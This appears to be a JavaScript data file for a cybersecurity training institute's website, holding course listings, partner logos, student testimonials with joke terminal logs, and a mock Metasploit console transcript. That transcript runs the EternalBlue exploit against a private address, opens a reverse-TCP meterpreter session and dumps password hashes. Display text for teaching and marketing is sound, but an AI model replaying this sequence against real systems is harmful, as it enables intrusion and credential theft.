
export const heroProgramData = [
    {
        id: "masters",
        title: "Master’s in Ethical Hacking & Cybersecurity",
        duration: "1 Year",
        certification: "6 Global Certs",
        highlight: "100% Placement",
        stats: [
            { label: "Placement", value: "100%" },
            { label: "Certs", value: "6 Global" },
            { label: "Mode", value: "Hybrid" },
        ],
        color: "from-blue-600 to-cyan-600",
    },
    {
        id: "graduate",
        title: "Graduate Program in Cybersecurity",
        duration: "9 Months",
        certification: "2 Global Certs",
        highlight: "Job-Ready",
        stats: [
            { label: "Duration", value: "9 Months" },
            { label: "Certs", value: "2 Global" },
            { label: "Focus", value: "Defensive" },
        ],
        color: "from-purple-600 to-pink-600",
    },
    {
        id: "masterclass",
        title: "CEH v13 Masterclass",
        duration: "4 Months",
        certification: "CEH Master",
        highlight: "Elite Skills",
        stats: [
            { label: "Version", value: "v13 AI" },
            { label: "Level", value: "Expert" },
            { label: "Labs", value: "Real-time" },
        ],
        color: "from-orange-600 to-red-600",
    },
];

export const partnerCourses = [
    { name: "Cisco", logo: "/images/partners/cisco.png" },
    { name: "EC-Council", logo: "/images/partners/ec-council.png" },
    { name: "CompTIA", logo: "/images/partners/comptia.png" },
];

export const metapsploitLogs = [
    {
        type: "ascii", text: ` 
      _                                                    _
     / \\      _-'
   _/|  \\-''- _ /
  __  {  |  /  \\   }      _
      /  \\  |     }    _-'
     /    \\ |  _   \\_-'
    /      \\|  \\-''
` },
    { type: "info", text: "=[ metasploit v6.3.4-dev                            ]" },
    { type: "info", text: "+ -- --=[ 2384 exploits - 1236 auxiliary - 428 post       ]" },
    { type: "info", text: "+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]" },
    { type: "info", text: "+ -- --=[ 9 evasion                                       ]" },
    { type: "input", text: "msf6 > search windows/smb" },
    { type: "success", text: "[+] Found 142 matching modules" },
    { type: "input", text: "msf6 > use exploit/windows/smb/ms17_010_eternalblue" },
    { type: "info", text: "[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp" },
    { type: "input", text: "msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.110" },
    { type: "success", text: "RHOSTS => 192.168.1.110" },
    { type: "input", text: "msf6 exploit(ms17_010_eternalblue) > run" },
    { type: "info", text: "[*] Started reverse TCP handler on 192.168.1.5:4444" },
    { type: "success", text: "[+] 192.168.1.110:445 - Target is vulnerable." },
    { type: "info", text: "[*] 192.168.1.110:445 - Connecting to target..." },
    { type: "success", text: "[+] 192.168.1.110:445 - WIN!" },
    { type: "success", text: "[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.110:49231)" },
    { type: "input", text: "meterpreter > hashdump" },
    { type: "warning", text: "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::" },
    { type: "input", text: "meterpreter > sysinfo" },
    { type: "info", text: "Computer: WIN-TARGET-01" },
    { type: "info", text: "OS: Windows 10 (10.0 Build 19045)" },
];

export const studentTransformationLogs = [
    { type: "info", text: "> INITIALIZING CAREER_UNLOCK_PROTOCOL..." },
    { type: "info", text: "> TARGET ROLE: CYBER SECURITY ANALYST" },
    { type: "progress", text: "Loading Module: Network_Defense", progress: 100 },
    { type: "progress", text: "Loading Module: VAPT_Framework", progress: 100 },
    { type: "success", text: "[OK] SKILLSET OPTIMIZED FOR MNC STANDARDS" },
    { type: "input", text: "$ bypass_salary_cap --force" },
    { type: "warning", text: "(!) DETECTING HIGH-VALUE OPPORTUNITIES..." },
    { type: "success", text: "[OK] OFFER LETTER ENCRYPTED." },
    { type: "success", text: "> DECRYPTING SUCCESS..." },
];

export const studentStories = [
    {
        name: "Anmol Gupta",
        role: "APV-DELIVERY",
        company: "Ampcus Cyber",
        package: "₹9 LPA",
        prevRole: "B.Tech Student",
        image: "/testimonials/person1.jpg",
        logs: [
            { type: "info", text: "> INITIALIZING PROFILE: ANMOL_G..." },
            { type: "warning", text: "> EXPERIENCE_LEVEL: FRESHER" },
            { type: "progress", text: "Compiling: Network_Security", progress: 100 },
            { type: "progress", text: "Loading: CEH_Certification", progress: 100 },
            { type: "success", text: "[OK] SKILLSET OPTIMIZED." },
            { type: "input", text: "$ launch_career.exe" },
            { type: "success", text: "> OFFER DETECTED: AMPCUS CYBER" },
            { type: "success", text: "> ROLE: APV-DELIVERY SECURED" },
        ]
    },
    {
        name: "Rohit Prasad",
        role: "Advisor",
        company: "Fiserv",
        package: "₹18 LPA",
        prevRole: "IT Manager",
        image: "/testimonials/person8.jpg",
        logs: [
            { type: "info", text: "> INITIALIZING PROFILE: ROHIT_P..." },
            { type: "info", text: "> CURRENT_STATUS: IT_MANAGER" },
            { type: "progress", text: "Upgrading: GRC_Frameworks", progress: 100 },
            { type: "progress", text: "Loading: CISO_Dashboard", progress: 100 },
            { type: "success", text: "[OK] STRATEGIC_ALIGNMENT_COMPLETE" },
            { type: "input", text: "$ sudo switch_domain --advisory" },
            { type: "success", text: "> OFFER DETECTED: FISERV" },
            { type: "success", text: "> ROLE_UPGRADE: ADVISOR" },
        ]
    },
    {
        name: "Snigdha Suresh",
        role: "Tech Support Eng.",
        company: "ASK4",
        package: "₹10 LPA",
        prevRole: "IT Support",
        image: "/testimonials/person7.jpg",
        logs: [
            { type: "info", text: "> INITIALIZING PROFILE: SNIGDHA_S..." },
            { type: "info", text: "> BACKGROUND: TECH_SUPPORT" },
            { type: "progress", text: "Injecting: Cloud_Security_Basics", progress: 100 },
            { type: "progress", text: "Loading: Incident_Response", progress: 100 },
            { type: "success", text: "[OK] BLUE_TEAM_READY" },
            { type: "input", text: "$ execute remote_support_hacks" },
            { type: "success", text: "> OFFER DETECTED: ASK4" },
            { type: "success", text: "> GLOBAL_OPPORTUNITY_UNLOCKED" },
        ]
    },
    {
        name: "Damini Ranganath",
        role: "Cyber Engineer",
        company: "Anuvu",
        package: "₹14 LPA",
        prevRole: "Software Dev",
        image: "/testimonials/person4.jpg",
        logs: [
            { type: "info", text: "> INITIALIZING PROFILE: DAMINI_R..." },
            { type: "info", text: "> BG: DEVELOPER_STACK" },
            { type: "progress", text: "Patching: Secure_Code_Review", progress: 100 },
            { type: "progress", text: "Loading: DevSecOps_Pipeline", progress: 100 },
            { type: "success", text: "[OK] SECURITY_ENGINEER_MODE" },
            { type: "input", text: "$ exploit dev_experience" },
            { type: "success", text: "> OFFER DETECTED: ANUVU" },
            { type: "success", text: "> CAREER_PIVOT_SUCCESSFUL" },
        ]
    },
    {
        name: "Vaddi Paneendar",
        role: "Red Teamer",
        company: "SISA",
        package: "₹12 LPA",
        prevRole: "Support Eng.",
        image: "/testimonials/person3.jpg",
        logs: [
            { type: "info", text: "> INITIALIZING PROFILE: VADDI_P..." },
            { type: "info", text: "> STATUS: L2_SUPPORT" },
            { type: "progress", text: "Loading: Advanced_Penetration", progress: 100 },
            { type: "progress", text: "Loading: Exploit_Development", progress: 100 },
            { type: "success", text: "[OK] RED_TEAM_OPERATOR_READY" },
            { type: "input", text: "$ run offensive_ops.sh" },
            { type: "success", text: "> OFFER DETECTED: SISA" },
            { type: "success", text: "> CRITICAL_MISSION_ASSIGNED" },
        ]
    },
    {
        name: "Rajiv Govind",
        role: "Head TA",
        company: "GT Compution",
        package: "₹15 LPA",
        prevRole: "System Admin",
        image: "/testimonials/person2.jpg",
        logs: [
            { type: "info", text: "> INITIALIZING PROFILE: RAJIV_G..." },
            { type: "info", text: "> TARGET: MENTORSHIP_LEAD" },
            { type: "progress", text: "Compiling: Cybersecurity_Curriculum", progress: 100 },
            { type: "progress", text: "Loading: Team_Leadership", progress: 100 },
            { type: "success", text: "[OK] KNOWLEDGE_BASE_EXPANDED" },
            { type: "input", text: "$ git push knowledge" },
            { type: "success", text: "> OFFER DETECTED: GT COMPUTION" },
            { type: "success", text: "> LEADERSHIP_ROLE_ACTIVE" },
        ]
    },
    {
        name: "Pranshu Tiwari",
        role: "Director Security",
        company: "Ampcus Cyber",
        package: "₹24 LPA",
        prevRole: "Network Admin",
        image: "/testimonials/person5.jpg",
        logs: [
            { type: "info", text: "> INITIALIZING PROFILE: PRANSHU_T..." },
            { type: "info", text: "> TARGET: EXECUTIVE_LEVEL" },
            { type: "progress", text: "Loading: Strategic_Security_Mgmt", progress: 100 },
            { type: "progress", text: "Loading: C-Suite_Communication", progress: 100 },
            { type: "success", text: "[OK] DIRECTOR_PROFILE_BUILT" },
            { type: "input", text: "$ execute leadership_override" },
            { type: "success", text: "> OFFER DETECTED: AMPCUS CYBER" },
            { type: "success", text: "> DIRECTOR_ACCESS_GRANTED" },
        ]
    },
    {
        name: "Abhinav Choubey",
        role: "Assoc. Director",
        company: "SISA",
        package: "₹22 LPA",
        prevRole: "IT Manager",
        image: "/testimonials/person6.jpg",
        logs: [
            { type: "info", text: "> INITIALIZING PROFILE: ABHINAV_C..." },
            { type: "info", text: "> BACKGROUND: MGMT_LAYER" },
            { type: "progress", text: "Upgrading: Compliance_&_Audit", progress: 100 },
            { type: "progress", text: "Loading: PCI_DSS_Expertise", progress: 100 },
            { type: "success", text: "[OK] AUDIT_LEADERSHIP_READY" },
            { type: "input", text: "$ audit_career_path" },
            { type: "success", text: "> OFFER DETECTED: SISA" },
            { type: "success", text: "> DOUBLE_PROMOTION_UNLOCKED" },
        ]
    }
];
